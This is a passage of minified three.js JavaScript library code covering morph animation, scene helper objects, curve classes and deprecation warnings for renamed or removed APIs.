c=this.animationsMap[a];c&&(c.fps=b,c.duration=(c.end-c.start)/c.fps)};oa.prototype.setAnimationDuration=function(a,b){var c=this.animationsMap[a];c&&(c.duration=b,c.fps=(c.end-c.start)/c.duration)};oa.prototype.setAnimationWeight=function(a,b){var c=this.animationsMap[a];c&&(c.weight=b)};oa.prototype.setAnimationTime=function(a,b){var c=this.animationsMap[a];c&&(c.time=b)};oa.prototype.getAnimationTime=function(a){var b=0;if(a=this.animationsMap[a])b=a.time;return b};oa.prototype.getAnimationDuration=\nfunction(a){var b=-1;if(a=this.animationsMap[a])b=a.duration;return b};oa.prototype.playAnimation=function(a){var b=this.animationsMap[a];b?(b.time=0,b.active=!0):console.warn(\"THREE.MorphBlendMesh: animation[\"+a+\"] undefined in .playAnimation()\")};oa.prototype.stopAnimation=function(a){if(a=this.animationsMap[a])a.active=!1};oa.prototype.update=function(a){for(var b=0,c=this.animationsList.length;b<c;b++){var d=this.animationsList[b];if(d.active){var e=d.duration/d.length;d.time+=d.direction*a;if(d.mirroredLoop){if(d.time>\nd.duration||0>d.time)d.direction*=-1,d.time>d.duration&&(d.time=d.duration,d.directionBackwards=!0),0>d.time&&(d.time=0,d.directionBackwards=!1)}else d.time%=d.duration,0>d.time&&(d.time+=d.duration);var f=d.start+N.clamp(Math.floor(d.time/e),0,d.length-1),g=d.weight;f!==d.currentFrame&&(this.morphTargetInfluences[d.lastFrame]=0,this.morphTargetInfluences[d.currentFrame]=1*g,this.morphTargetInfluences[f]=0,d.lastFrame=d.currentFrame,d.currentFrame=f);e=d.time%e/e;d.directionBackwards&&(e=1-e);d.currentFrame!==\nd.lastFrame?(this.morphTargetInfluences[d.currentFrame]=e*g,this.morphTargetInfluences[d.lastFrame]=(1-e)*g):this.morphTargetInfluences[d.currentFrame]=g}}};dd.prototype=Object.create(x.prototype);dd.prototype.constructor=dd;dd.prototype.isImmediateRenderObject=!0;ed.prototype=Object.create(ga.prototype);ed.prototype.constructor=ed;ed.prototype.update=function(){var a=new q,b=new q,c=new ya;return function(){var d=[\"a\",\"b\",\"c\"];this.object.updateMatrixWorld(!0);c.getNormalMatrix(this.object.matrixWorld);\nvar e=this.object.matrixWorld,f=this.geometry.attributes.position,g=this.object.geometry;if(g&&g.isGeometry)for(var h=g.vertices,l=g.faces,k=g=0,q=l.length;k<q;k++)for(var p=l[k],n=0,u=p.vertexNormals.length;n<u;n++){var x=p.vertexNormals[n];a.copy(h[p[d[n]]]).applyMatrix4(e);b.copy(x).applyMatrix3(c).normalize().multiplyScalar(this.size).add(a);f.setXYZ(g,a.x,a.y,a.z);g+=1;f.setXYZ(g,b.x,b.y,b.z);g+=1}else if(g&&g.isBufferGeometry)for(d=g.attributes.position,h=g.attributes.normal,n=g=0,u=d.count;n<\nu;n++)a.set(d.getX(n),d.getY(n),d.getZ(n)).applyMatrix4(e),b.set(h.getX(n),h.getY(n),h.getZ(n)),b.applyMatrix3(c).normalize().multiplyScalar(this.size).add(a),f.setXYZ(g,a.x,a.y,a.z),g+=1,f.setXYZ(g,b.x,b.y,b.z),g+=1;f.needsUpdate=!0;return this}}();lc.prototype=Object.create(x.prototype);lc.prototype.constructor=lc;lc.prototype.dispose=function(){this.cone.geometry.dispose();this.cone.material.dispose()};lc.prototype.update=function(){var a=new q,b=new q;return function(){var c=this.light.distance?\nthis.light.distance:1E3,d=c*Math.tan(this.light.angle);this.cone.scale.set(d,d,c);a.setFromMatrixPosition(this.light.matrixWorld);b.setFromMatrixPosition(this.light.target.matrixWorld);this.cone.lookAt(b.sub(a));this.cone.material.color.copy(this.light.color).multiplyScalar(this.light.intensity)}}();mc.prototype=Object.create(ga.prototype);mc.prototype.constructor=mc;mc.prototype.getBoneList=function(a){var b=[];a&&a.isBone&&b.push(a);for(var c=0;c<a.children.length;c++)b.push.apply(b,this.getBoneList(a.children[c]));\nreturn b};mc.prototype.update=function(){var a=new q,b=new S,c=new S;return function(){var d=this.geometry,e=d.getAttribute(\"position\");c.getInverse(this.root.matrixWorld);for(var f=0,g=0;f<this.bones.length;f++){var h=this.bones[f];h.parent&&h.parent.isBone&&(b.multiplyMatrices(c,h.matrixWorld),a.setFromMatrixPosition(b),e.setXYZ(g,a.x,a.y,a.z),b.multiplyMatrices(c,h.parent.matrixWorld),a.setFromMatrixPosition(b),e.setXYZ(g+1,a.x,a.y,a.z),g+=2)}d.getAttribute(\"position\").needsUpdate=!0}}();nc.prototype=\nObject.create(Aa.prototype);nc.prototype.constructor=nc;nc.prototype.dispose=function(){this.geometry.dispose();this.material.dispose()};nc.prototype.update=function(){this.material.color.copy(this.light.color).multiplyScalar(this.light.intensity)};oc.prototype=Object.create(x.prototype);oc.prototype.constructor=oc;oc.prototype.dispose=function(){this.children[0].geometry.dispose();this.children[0].material.dispose();this.children[1].geometry.dispose();this.children[1].material.dispose()};oc.prototype.update=\nfunction(){var a=new q,b=new q;return function(){var c=this.children[0],d=this.children[1];if(this.light.target){a.setFromMatrixPosition(this.light.matrixWorld);b.setFromMatrixPosition(this.light.target.matrixWorld);var e=b.clone().sub(a);c.lookAt(e);d.lookAt(e)}c.material.color.copy(this.light.color).multiplyScalar(this.light.intensity);d.material.color.copy(this.light.color).multiplyScalar(this.light.intensity);var d=.5*this.light.width,e=.5*this.light.height,c=c.geometry.getAttribute(\"position\"),\nf=c.array;f[0]=d;f[1]=-e;f[2]=0;f[3]=d;f[4]=e;f[5]=0;f[6]=-d;f[7]=e;f[8]=0;f[9]=-d;f[10]=e;f[11]=0;f[12]=-d;f[13]=-e;f[14]=0;f[15]=d;f[16]=-e;f[17]=0;c.needsUpdate=!0}}();pc.prototype=Object.create(x.prototype);pc.prototype.constructor=pc;pc.prototype.dispose=function(){this.children[0].geometry.dispose();this.children[0].material.dispose()};pc.prototype.update=function(){var a=new q,b=new J,c=new J;return function(){var d=this.children[0],e=d.geometry.getAttribute(\"color\");b.copy(this.light.color).multiplyScalar(this.light.intensity);\nc.copy(this.light.groundColor).multiplyScalar(this.light.intensity);for(var f=0,g=e.count;f<g;f++){var h=f<g/2?b:c;e.setXYZ(f,h.r,h.g,h.b)}d.lookAt(a.setFromMatrixPosition(this.light.matrixWorld).negate());e.needsUpdate=!0}}();fd.prototype=Object.create(ga.prototype);fd.prototype.constructor=fd;Ld.prototype=Object.create(ga.prototype);Ld.prototype.constructor=Ld;gd.prototype=Object.create(ga.prototype);gd.prototype.constructor=gd;gd.prototype.update=function(){var a=new q,b=new q,c=new ya;return function(){this.object.updateMatrixWorld(!0);\nc.getNormalMatrix(this.object.matrixWorld);for(var d=this.object.matrixWorld,e=this.geometry.attributes.position,f=this.object.geometry,g=f.vertices,f=f.faces,h=0,l=0,k=f.length;l<k;l++){var q=f[l],p=q.normal;a.copy(g[q.a]).add(g[q.b]).add(g[q.c]).divideScalar(3).applyMatrix4(d);b.copy(p).applyMatrix3(c).normalize().multiplyScalar(this.size).add(a);e.setXYZ(h,a.x,a.y,a.z);h+=1;e.setXYZ(h,b.x,b.y,b.z);h+=1}e.needsUpdate=!0;return this}}();qc.prototype=Object.create(x.prototype);qc.prototype.constructor=\nqc;qc.prototype.dispose=function(){var a=this.children[0],b=this.children[1];a.geometry.dispose();a.material.dispose();b.geometry.dispose();b.material.dispose()};qc.prototype.update=function(){var a=new q,b=new q,c=new q;return function(){a.setFromMatrixPosition(this.light.matrixWorld);b.setFromMatrixPosition(this.light.target.matrixWorld);c.subVectors(b,a);var d=this.children[0],e=this.children[1];d.lookAt(c);d.material.color.copy(this.light.color).multiplyScalar(this.light.intensity);e.lookAt(c);\ne.scale.z=c.length()}}();hd.prototype=Object.create(ga.prototype);hd.prototype.constructor=hd;hd.prototype.update=function(){function a(a,g,h,l){d.set(g,h,l).unproject(e);a=c[a];if(void 0!==a)for(g=b.getAttribute(\"position\"),h=0,l=a.length;h<l;h++)g.setXYZ(a[h],d.x,d.y,d.z)}var b,c,d=new q,e=new ra;return function(){b=this.geometry;c=this.pointMap;e.projectionMatrix.copy(this.camera.projectionMatrix);a(\"c\",0,0,-1);a(\"t\",0,0,1);a(\"n1\",-1,-1,-1);a(\"n2\",1,-1,-1);a(\"n3\",-1,1,-1);a(\"n4\",1,1,-1);a(\"f1\",\n-1,-1,1);a(\"f2\",1,-1,1);a(\"f3\",-1,1,1);a(\"f4\",1,1,1);a(\"u1\",.7,1.1,-1);a(\"u2\",-.7,1.1,-1);a(\"u3\",0,2,-1);a(\"cf1\",-1,0,1);a(\"cf2\",1,0,1);a(\"cf3\",0,-1,1);a(\"cf4\",0,1,1);a(\"cn1\",-1,0,-1);a(\"cn2\",1,0,-1);a(\"cn3\",0,-1,-1);a(\"cn4\",0,1,-1);b.getAttribute(\"position\").needsUpdate=!0}}();rc.prototype=Object.create(ga.prototype);rc.prototype.constructor=rc;rc.prototype.update=function(){var a=new Pa;return function(b){b&&b.isBox3?a.copy(b):a.setFromObject(b);if(!a.isEmpty()){b=a.min;var c=a.max,d=this.geometry.attributes.position,\ne=d.array;e[0]=c.x;e[1]=c.y;e[2]=c.z;e[3]=b.x;e[4]=c.y;e[5]=c.z;e[6]=b.x;e[7]=b.y;e[8]=c.z;e[9]=c.x;e[10]=b.y;e[11]=c.z;e[12]=c.x;e[13]=c.y;e[14]=b.z;e[15]=b.x;e[16]=c.y;e[17]=b.z;e[18]=b.x;e[19]=b.y;e[20]=b.z;e[21]=c.x;e[22]=b.y;e[23]=b.z;d.needsUpdate=!0;this.geometry.computeBoundingSphere()}}}();var Md,ue;Fb.prototype=Object.create(x.prototype);Fb.prototype.constructor=Fb;Fb.prototype.setDirection=function(){var a=new q,b;return function(c){.99999<c.y?this.quaternion.set(0,0,0,1):-.99999>c.y?this.quaternion.set(1,\n0,0,0):(a.set(c.z,0,-c.x).normalize(),b=Math.acos(c.y),this.quaternion.setFromAxisAngle(a,b))}}();Fb.prototype.setLength=function(a,b,c){void 0===b&&(b=.2*a);void 0===c&&(c=.2*b);this.line.scale.set(1,Math.max(0,a-b),1);this.line.updateMatrix();this.cone.scale.set(c,b,c);this.cone.position.y=a;this.cone.updateMatrix()};Fb.prototype.setColor=function(a){this.line.material.color.copy(a);this.cone.material.color.copy(a)};Nd.prototype=Object.create(ga.prototype);Nd.prototype.constructor=Nd;var Qd=new q,\nye=new ve,ze=new ve,Ae=new ve;va.prototype=Object.create(ua.prototype);va.prototype.constructor=va;va.prototype.getPoint=function(a){var b=this.points,c=b.length;2>c&&console.log(\"duh, you need at least 2 points\");a*=c-(this.closed?0:1);var d=Math.floor(a);a-=d;this.closed?d+=0<d?0:(Math.floor(Math.abs(d)/b.length)+1)*b.length:0===a&&d===c-1&&(d=c-2,a=1);var e,f,g;this.closed||0<d?e=b[(d-1)%c]:(Qd.subVectors(b[0],b[1]).add(b[0]),e=Qd);f=b[d%c];g=b[(d+1)%c];this.closed||d+2<c?b=b[(d+2)%c]:(Qd.subVectors(b[c-\n1],b[c-2]).add(b[c-1]),b=Qd);if(void 0===this.type||\"centripetal\"===this.type||\"chordal\"===this.type){var h=\"chordal\"===this.type?.5:.25,c=Math.pow(e.distanceToSquared(f),h),d=Math.pow(f.distanceToSquared(g),h),h=Math.pow(g.distanceToSquared(b),h);1E-4>d&&(d=1);1E-4>c&&(c=d);1E-4>h&&(h=d);ye.initNonuniformCatmullRom(e.x,f.x,g.x,b.x,c,d,h);ze.initNonuniformCatmullRom(e.y,f.y,g.y,b.y,c,d,h);Ae.initNonuniformCatmullRom(e.z,f.z,g.z,b.z,c,d,h)}else\"catmullrom\"===this.type&&(c=void 0!==this.tension?this.tension:\n.5,ye.initCatmullRom(e.x,f.x,g.x,b.x,c),ze.initCatmullRom(e.y,f.y,g.y,b.y,c),Ae.initCatmullRom(e.z,f.z,g.z,b.z,c));return new q(ye.calc(a),ze.calc(a),Ae.calc(a))};id.prototype=Object.create(ua.prototype);id.prototype.constructor=id;id.prototype.getPoint=function(a){var b=this.v0,c=this.v1,d=this.v2,e=this.v3;return new q(Bb(a,b.x,c.x,d.x,e.x),Bb(a,b.y,c.y,d.y,e.y),Bb(a,b.z,c.z,d.z,e.z))};jd.prototype=Object.create(ua.prototype);jd.prototype.constructor=jd;jd.prototype.getPoint=function(a){var b=this.v0,\nc=this.v1,d=this.v2;return new q(Ab(a,b.x,c.x,d.x),Ab(a,b.y,c.y,d.y),Ab(a,b.z,c.z,d.z))};kd.prototype=Object.create(ua.prototype);kd.prototype.constructor=kd;kd.prototype.getPoint=function(a){if(1===a)return this.v2.clone();var b=new q;b.subVectors(this.v2,this.v1);b.multiplyScalar(a);b.add(this.v1);return b};Od.prototype=Object.create(Wa.prototype);Od.prototype.constructor=Od;ua.create=function(a,b){console.log(\"THREE.Curve.create() has been deprecated\");a.prototype=Object.create(ua.prototype);a.prototype.constructor=\na;a.prototype.getPoint=b;return a};Xe.prototype=Object.create(va.prototype);Ye.prototype=Object.create(va.prototype);we.prototype=Object.create(va.prototype);Object.assign(we.prototype,{initFromArray:function(a){console.error(\"THREE.Spline: .initFromArray() has been removed.\")},getControlPointsArray:function(a){console.error(\"THREE.Spline: .getControlPointsArray() has been removed.\")},reparametrizeByArcLength:function(a){console.error(\"THREE.Spline: .reparametrizeByArcLength() has been removed.\")}});\nfd.prototype.setColors=function(){console.error(\"THREE.GridHelper: setColors() has been deprecated, pass them in the constructor instead.\")};Object.assign(sc.prototype,{center:function(a){console.warn(\"THREE.Box2: .center() has been renamed to .getCenter().\");return this.getCenter(a)},empty:function(){console.warn(\"THREE.Box2: .empty() has been renamed to .isEmpty().\");return this.isEmpty()},isIntersectionBox:function(a){console.warn(\"THREE.Box2: .isIntersectionBox() has been renamed to .intersectsBox().\");\nreturn this.intersectsBox(a)},size:function(a){console.warn(\"THREE.Box2: .size() has been renamed to .getSize().\");return this.getSize(a)}});Object.assign(Pa.prototype,{center:function(a){console.warn(\"THREE.Box3: .center() has been renamed to .getCenter().\");return this.getCenter(a)},empty:function(){console.warn(\"THREE.Box3: .empty() has been renamed to .isEmpty().\");return this.isEmpty()},isIntersectionBox:function(a){console.warn(\"THREE.Box3: .isIntersectionBox() has been renamed to .intersectsBox().\");\nreturn this.intersectsBox(a)},isIntersectionSphere:function(a){console.warn(\"THREE.Box3: .isIntersectionSphere() has been renamed to .intersectsSphere().\");return this.intersectsSphere(a)},size:function(a){console.warn(\"THREE.Box3: .size() has been renamed to .getSize().\");return this.getSize(a)}});hb.prototype.center=function(a){console.warn(\"THREE.Line3: .center() has been renamed to .getCenter().\");return this.getCenter(a)};N.random16=function(){console.warn(\"THREE.Math.random16() has been deprecated. Use Math.random() instead.\");\nreturn Math.random()};Object.assign(ya.prototype,{flattenToArrayOffset:function(a,b){console.warn(\"THREE.Matrix3: .flattenToArrayOffset() has been deprecated. Use .toArray() instead.\");return this.toArray(a,b)},multiplyVector3:function(a){console.warn(\"THREE.Matrix3: .multiplyVector3() has been removed. Use vector.applyMatrix3( matrix ) instead.\");return a.applyMatrix3(this)},multiplyVector3Array:function(a){console.warn(\"THREE.Matrix3: .multiplyVector3Array() has been renamed. Use matrix.applyToVector3Array( array ) instead.\");\nreturn this.applyToVector3Array(a)},applyToBuffer:function(a,b,c){console.warn(\"THREE.Matrix3: .applyToBuffer() has been removed. Use matrix.applyToBufferAttribute( attribute ) instead.\");return this.applyToBufferAttribute(a)},applyToVector3Array:function(a,b,c){console.error(\"THREE.Matrix3: .applyToVector3Array() has been removed.\")}});Object.assign(S.prototype,{extractPosition:function(a){console.warn(\"THREE.Matrix4: .extractPosition() has been renamed to .copyPosition().\");return this.copyPosition(a)},\nflattenToArrayOffset:function(a,b){console.warn(\"THREE.Matrix4: .flattenToArrayOffset() has been deprecated. Use .toArray() instead.\");return this.toArray(a,b)},getPosition:function(){var a;return function(){void 0===a&&(a=new q);console.warn(\"THREE.Matrix4: .getPosition() has been removed. Use Vector3.setFromMatrixPosition( matrix ) instead.\");return a.setFromMatrixColumn(this,3)}}(),setRotationFromQuaternion:function(a){console.warn(\"THREE.Matrix4: .setRotationFromQuaternion() has been renamed to .makeRotationFromQuaternion().\");\nreturn this.makeRotationFromQuaternion(a)},multiplyVector3:function(a){console.warn(\"THREE.Matrix4: .multiplyVector3() has been removed. Use vector.applyMatrix4( matrix ) instead.\");return a.applyMatrix4(this)},multiplyVector4:function(a){console.warn(\"THREE.Matrix4: .multiplyVector4() has been removed. Use vector.applyMatrix4( matrix ) instead.\");return a.applyMatrix4(this)},multiplyVector3Array:function(a){console.warn(\"THREE.Matrix4: .multiplyVector3Array() has been renamed. Use matrix.applyToVector3Array( array ) instead.\");\nreturn this.applyToVector3Array(a)},rotateAxis:function(a){console.warn(\"THREE.Matrix4: .rotateAxis() has been removed. Use Vector3.transformDirection( matrix ) instead.\");a.transformDirection(this)},crossVector:function(a){console.warn(\"THREE.Matrix4: .crossVector() has been removed. Use vector.applyMatrix4( matrix ) instead.\");return a.applyMatrix4(this)},translate:function(){console.error(\"THREE.Matrix4: .translate() has been removed.\")},rotateX:function(){console.error(\"THREE.Matrix4: .rotateX() has been removed.\")},\nrotateY:function(){console.error(\"THREE.Matrix4: .rotateY() has been removed.\")},rotateZ:function(){console.error(\"THREE.Matrix4: .rotateZ() has been removed.\")},rotateByAxis:function(){console.error(\"THREE.Matrix4: .rotateByAxis() has been removed.\")},applyToBuffer:function(a,b,c){console.warn(\"THREE.Matrix4: .applyToBuffer() has been removed. Use matrix.applyToBufferAttribute( attribute ) instead.\");return this.applyToBufferAttribute(a)},applyToVector3Array:function(a,b,c){console.error(\"THREE.Matrix4: .applyToVector3Array() has been removed.\")},\nmakeFrustum:function(a,b,c,d,e,f){console.warn(\"THREE.Matrix4: .makeFrustum() has been removed. Use .makePerspective( left, right, top, bottom, near, far ) instead.\");return this.makePerspective(a,b,d,c,e,f)}});la.prototype.isIntersectionLine=function(a){console.warn(\"THREE.Plane: .isIntersectionLine() has been renamed to .intersectsLine().\");return this.intersectsLine(a)};ca.prototype.multiplyVector3=function(a){console.warn(\"THREE.Quaternion: .multiplyVector3() has been removed. Use is now vector.applyQuaternion( quaternion ) instead.\");\nreturn a.applyQuaternion(this)};Object.assign(cb.prototype,{isIntersectionBox:function(a){console.warn(\"THREE.Ray: .isIntersectionBox() has been renamed to .intersectsBox().\");return this.intersectsBox(a)},isIntersectionPlane:function(a){console.warn(\"THREE.Ray: .isIntersectionPlane() has been renamed to .intersectsPlane().\");return this.intersectsPlane(a)},isIntersectionSphere:function(a){console.warn(\"THREE.Ray: .isIntersectionSphere() has been renamed to .intersectsSphere().\");return this.intersectsSphere(a)}});\nObject.assign(Db.prototype,{extrude:function(a){console.warn(\"THREE.Shape: .extrude() has been removed. Use ExtrudeGeometry() instead.\");return new La(this,a)},makeGeometry:function(a){console.warn(\"THREE.Shape: .makeGeometry() has been removed. Use ShapeGeometry() instead.\");return new Yb(this,a)}});Object.assign(D.prototype,{fromAttribute:function(a,b,c){console.error(\"THREE.Vector2: .fromAttribute() has been renamed to .fromBufferAttribute().\");return this.fromBufferAttribute(a,b,c)}});Object.assign(q.prototype,\n{setEulerFromRotationMatrix:function(){console.error(\"THREE.Vector3: .setEulerFromRotationMatrix() has been removed. Use Euler.setFromRotationMatrix() instead.\")},setEulerFromQuaternion:function(){console.error(\"THREE.Vector3: .setEulerFromQuaternion() has been removed. Use Euler.setFromQuaternion() instead.\")},getPositionFromMatrix:function(a){console.warn(\"THREE.Vector3: .getPositionFromMatrix() has been renamed to .setFromMatrixPosition().\");return this.setFromMatrixPosition(a)},getScaleFromMatrix:function(a){console.warn(\"THREE.Vector3: .getScaleFromMatrix() has been renamed to .setFromMatrixScale().\");\nreturn this.setFromMatrixScale(a)},getColumnFromMatrix:function(a,b){console.warn(\"THREE.Vector3: .getColumnFromMatrix() has been renamed to .setFromMatrixColumn().\");return this.setFromMatrixColumn(b,a)},applyProjection:function(a){console.warn(\"THREE.Vector3: .applyProjection() has been removed. Use .applyMatrix4( m ) instead.\");return this.applyMatrix4(a)},fromAttribute:function(a,b,c){console.error(\"THREE.Vector3: .fromAttribute() has been renamed to .fromBufferAttribute().\");return this.fromBufferAttribute(a,\nb,c)}});Object.assign(fa.prototype,{fromAttribute:function(a,b,c){console.error(\"THREE.Vector4: .fromAttribute() has been renamed to .fromBufferAttribute().\");return this.fromBufferAttribute(a,b,c)}});T.prototype.computeTangents=function(){console.warn(\"THREE.Geometry: .computeTangents() has been removed.\")};Object.assign(x.prototype,{getChildByName:function(a){console.warn(\"THREE.Object3D: .getChildByName() has been renamed to .getObjectByName().\");return this.getObjectByName(a)},renderDepth:function(){console.warn(\"THREE.Object3D: .renderDepth has been removed. Use .renderOrder, instead.\")},\ntranslate:function(a,b){console.warn(\"THREE.Object3D: .translate() has been removed. Use .translateOnAxis( axis, distance ) instead.\");return this.translateOnAxis(b,a)}});Object.defineProperties(x.prototype,{eulerOrder:{get:function(){console.warn(\"THREE.Object3D: .eulerOrder is now .rotation.order.\");return this.rotation.order},set:function(a){console.warn(\"THREE.Object3D: .eulerOrder is now .rotation.order.\");this.rotation.order=a}},useQuaternion:{get:function(){console.warn(\"THREE.Object3D: .useQuaternion has been removed. The library now uses quaternions by default.\")},\nset:function(){console.warn(\"THREE.Object3D: .useQuaternion has been removed. The library now uses quaternions by default.\")}}});Object.defineProperties(Ec.prototype,{objects:{get:function(){console.warn(\"THREE.LOD: .objects has been renamed to .levels.\");return this.levels}}});Fa.prototype.setLens=function(a,b){console.warn(\"THREE.PerspectiveCamera.setLens is deprecated. Use .setFocalLength and .filmGauge for a photographic setup.\");void 0!==b&&(this.filmGauge=b);this.setFocalLength(a)};Object.defineProperties(ma.prototype,\n{onlyShadow:{set:function(){console.warn(\"THREE.Light: .onlyShadow has been removed.\")}},shadowCameraFov:{set:function(a){console.warn(\"THREE.Light: .shadowCameraFov is now .shadow.camera.fov.\");this.shadow.camera.fov=a}},shadowCameraLeft:{set:function(a){console.warn(\"THREE.Light: .shadowCameraLeft is now .shadow.camera.left.\");this.shadow.camera.left=a}},shadowCameraRight:{set:function(a){console.warn(\"THREE.Light: .shadowCameraRight is now .shadow.camera.right.\");this.shadow.camera.right=a}},shadowCameraTop:{set:function(a){console.warn(\"THREE.Light: .shadowCameraTop is now .shadow.camera.top.\");\nthis.shadow.camera.top=a}},shadowCameraBottom:{set:function(a){console.warn(\"THREE.Light: .shadowCameraBottom is now .shadow.camera.bottom.\");this.shadow.camera.bottom=a}},shadowCameraNear:{set:function(a){console.warn(\"THREE.Light: .shadowCameraNear is now .shadow.camera.near.\");this.shadow.camera.near=a}},shadowCameraFar:{set:function(a){console.warn(\"THREE.Light: .shadowCameraFar is now .shadow.camera.far.\");this.shadow.camera.far=a}},shadowCameraVisible:{set:function(){console.warn(\"THREE.Light: .shadowCameraVisible has been removed. Use new THREE.CameraHelper( light.shadow.camera ) instead.\")}},\nshadowBias:{set:function(a){console.warn(\"THREE.Light: .shadowBias is now .shadow.bias.\");this.shadow.bias=a}},shadowDarkness:{set:function(){console.warn(\"THREE.Light: .shadowDarkness has been removed.\")}},shadowMapWidth:{set:function(a){console.warn(\"THREE.Light: .shadowMapWidth is now .shadow.mapSize.width.\");this.shadow.mapSize.width=a}},shadowMapHeight:{set:function(a){console.warn(\"THREE.Light: .shadowMapHeight is now .shadow.mapSize.height.\");this.shadow.mapSize.height=a}}});Object.defineProperties(U.prototype,\n{length:{get:function(){console.warn(\"THREE.BufferAttribute: .length has been deprecated. Use .count instead.\");return this.array.length}}});Object.assign(I.prototype,{addIndex:function(a){console.warn(\"THREE.BufferGeometry: .addIndex() has been renamed to .setIndex().\");this.setIndex(a)},addDrawCall:function(a,b,c){void 0!==c&&console.warn(\"THREE.BufferGeometry: .addDrawCall() no longer supports indexOffset.\");console.warn(\"THREE.BufferGeometry: .addDrawCall() is now .addGroup().\");this.addGroup(a,\nb)},clearDrawCalls:function(){console.warn(\"THREE.BufferGeometry: .clearDrawCalls() is now .clearGroups().\");this.clearGroups()},computeTangents:function(){console.warn(\"THREE.BufferGeometry: .computeTangents() has been removed.\")},computeOffsets:function(){console.warn(\"THREE.BufferGeometry: .computeOffsets() has been removed.\")}});Object.defineProperties(I.prototype,{drawcalls:{get:function(){console.error(\"THREE.BufferGeometry: .drawcalls has been renamed to .groups.\");return this.groups}},offsets:{get:function(){console.warn(\"THREE.BufferGeometry: .offsets has been renamed to .groups.\");\nreturn this.groups}}});Object.defineProperties(Kd.prototype,{dynamic:{set:function(){console.warn(\"THREE.Uniform: .dynamic has been removed. Use object.onBeforeRender() instead.\")}},onUpdate:{value:function(){console.warn(\"THREE.Uniform: .onUpdate() has been removed. Use object.onBeforeRender() instead.\");return this}}});Object.defineProperties(X.prototype,{wrapAround:{get:function(){console.warn(\"THREE.\"+this.type+\": .wrapAround has been removed.\")},set:function(){console.warn(\"THREE.\"+this.type+\n\": .wrapAround has been removed.\")}},wrapRGB:{get:function(){console.warn(\"THREE.\"+this.type+\": .wrapRGB has been removed.\");return new J}}});Object.defineProperties(Ca.prototype,{metal:{get:function(){console.warn(\"THREE.MeshPhongMaterial: .metal has been removed. Use THREE.MeshStandardMaterial instead.\");return!1},set:function(){console.warn(\"THREE.MeshPhongMaterial: .metal has been removed. Use THREE.MeshStandardMaterial instead\")}}});Object.defineProperties(Ha.prototype,{derivatives:{get:function(){console.warn(\"THREE.ShaderMaterial: .derivatives has been moved to .extensions.derivatives.\");\nreturn this.extensions.derivatives},set:function(a){console.warn(\"THREE. ShaderMaterial: .derivatives has been moved to .extensions.derivatives.\");this.extensions.derivatives=a}}});Object.assign(Yd.prototype,{supportsFloatTextures:function(){console.warn(\"THREE.WebGLRenderer: .supportsFloatTextures() is now .extensions.get( 'OES_texture_float' ).\");return this.extensions.get(\"OES_texture_float\")},supportsHalfFloatTextures:function(){console.warn(\"THREE.WebGLRenderer: .supportsHalfFloatTextures() is now .extensions.get( 'OES_texture_half_float' ).\");\nreturn this.extensions.get(\"OES_texture_half_float\")},supportsStandardDerivatives:function(){console.warn(\"THREE.WebGLRenderer: .supportsStandardDerivatives() is now .extensions.get( 'OES_standard_derivatives' ).\");return this.extensions.get(\"OES_standard_derivatives\")},supportsCompressedTextureS3TC:function(){console.warn(\"THREE.WebGLRenderer: .supportsCompressedTextureS3TC() is now .extensions.get( 'WEBGL_compressed_texture_s3tc' ).\");return this.extensions.get(\"WEBGL_compressed_texture_s3tc\")},\nsupportsCompressedTexturePVRTC:function(){console.warn(\"THREE.WebGLRenderer: .supportsCompressedTexturePVRTC() is now .extensions.get( 'WEBGL_compressed_texture_pvrtc' ).\");return this.extensions.get(\"WEBGL_compressed_texture_pvrtc\")},supportsBlendMinMax:function(){console.warn(\"THREE.WebGLRenderer: .supportsBlendMinMax() is now .extensions.get( 'EXT_blend_minmax' ).\");return this.extensions.get(\"EXT_blend_minmax\")},supportsVertexTextures:function(){console.warn(\"THREE.WebGLRenderer: .supportsVertexTextures() is now .capabilities.vertexTextures.\");\nreturn this.capabilities.vertexTextures},supportsInstancedArrays:function(){console.warn(\"THREE.WebGLRenderer: .supportsInstancedArrays() is now .extensions.get( 'ANGLE_instanced_arrays' ).\");return this.extensions.get(\"ANGLE_instanced_arrays\")},enableScissorTest:function(a){console.warn(\"THREE.WebGLRenderer: .enableScissorTest() is now .setScissorTest().\");this.setScissorTest(a)},initMaterial:function(){console.warn(\"THREE.WebGLRenderer: .initMaterial() has been removed.\")},addPrePlugin:function(){console.warn(\"THREE.WebGLRenderer: .addPrePlugin() has been removed.\")},\naddPostPlugin:function(){console.warn(\"THREE.WebGLRenderer: .addPostPlugin() has been removed.\")},updateShadowMap:function(){console.warn(\"THREE.WebGLRenderer: .updateShadowMap() has been removed.\")}});Object.defineProperties(Yd.prototype,{shadowMapEnabled:{get:function(){return this.shadowMap.enabled},set:function(a){console.warn(\"THREE.WebGLRenderer: .shadowMapEnabled is now .shadowMap.enabled.\");this.shadowMap.enabled=a}},shadowMapType:{get:function(){return this.shadowMap.type},set:function(a){console.warn(\"THREE.WebGLRenderer: .shadowMapType is now .shadowMap.type.\");\nthis.shadowMap.type=a}},shadowMapCullFace:{get:function(){return this.shadowMap.cullFace},set:function(a){console.warn(\"THREE.WebGLRenderer: .shadowMapCullFace is now .shadowMap.cullFace.\");this.shadowMap.cullFace=a}}});Object.defineProperties(Ke.prototype,{cullFace:{get:function(){return this.renderReverseSided?2:1},set:function(a){a=1!==a;console.warn(\"WebGLRenderer: .shadowMap.cullFace is deprecated. Set .shadowMap.renderReverseSided to \"+a+\".\");this.renderReverseSided=a}}});Object.defineProperties(Ya.prototype,\n{wrapS:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .wrapS is now .texture.wrapS.\");return this.texture.wrapS},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .wrapS is now .texture.wrapS.\");this.texture.wrapS=a}},wrapT:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .wrapT is now .texture.wrapT.\");return this.texture.wrapT},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .wrapT is now .texture.wrapT.\");this.texture.wrapT=a}},magFilter:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .magFilter is now .texture.magFilter.\");\nreturn this.texture.magFilter},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .magFilter is now .texture.magFilter.\");this.texture.magFilter=a}},minFilter:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .minFilter is now .texture.minFilter.\");return this.texture.minFilter},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .minFilter is now .texture.minFilter.\");this.texture.minFilter=a}},anisotropy:{get:function(){console.warn(\"THREE.WebGLRenderTarget: .anisotropy is now .texture.anisotropy.\");\nreturn this.texture.anisotropy},set:function(a){console.warn(\"THREE.WebGLRenderTarget: .anisotropy is now 